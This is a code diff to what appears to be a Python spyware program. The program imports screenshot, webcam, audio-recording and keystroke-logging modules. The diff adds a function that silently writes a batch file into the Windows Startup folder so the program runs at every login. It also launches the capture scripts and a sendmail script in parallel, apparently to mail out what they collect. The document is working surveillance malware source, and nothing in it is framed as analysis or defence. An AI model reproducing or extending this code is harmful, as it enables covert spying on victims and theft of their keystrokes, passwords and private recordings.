@@ -9,6 +9,29 @@ from audio import recording
 from KeyStrokes import strokes
 import time
 import multiprocessing
+import platform
+try:
+    import getpass
+    import winreg as reg
+except:
+    pass
+
+
+processes = ["audio.py", "Screenshot.py", "KeyStrokes.py", "sendmail.py"]
+
+
+def auto_start(file_path=""):
+    os_name = platform.system()
+    try:
+        if os_name == 'Windows':
+            USER_NAME = getpass.getuser()
+            if file_path == "":
+                file_path = os.path.dirname(os.path.realpath(__file__))
+            bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
+            with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
+                bat_file.write(r'start "" %s' % file_path)
+    except:
+        pass
 
 
 def file_name():
@@ -32,19 +55,20 @@ def change_location():
     os.chdir(loc_ss)
 
 
+def terminal(process):
+    os.system('python {}'.format(process))
+
+
 def start():
     global screen
     global camera
     global audio
     global keys
-    ss = multiprocessing.Process(capture_ss)
-    cam = multiprocessing.Process(capture_photo)
-    sound = multiprocessing.Process(recording)
-    keys = multiprocessing.Process(strokes)
-    ss.start()
-    cam.start()
-    sound.start()
-    #keys.start()
+    try:
+        pool = multiprocessing.Pool(4)
+        pool.map(terminal, processes)
+    except KeyboardInterrupt:
+        exit()
 
 
 screen = ""
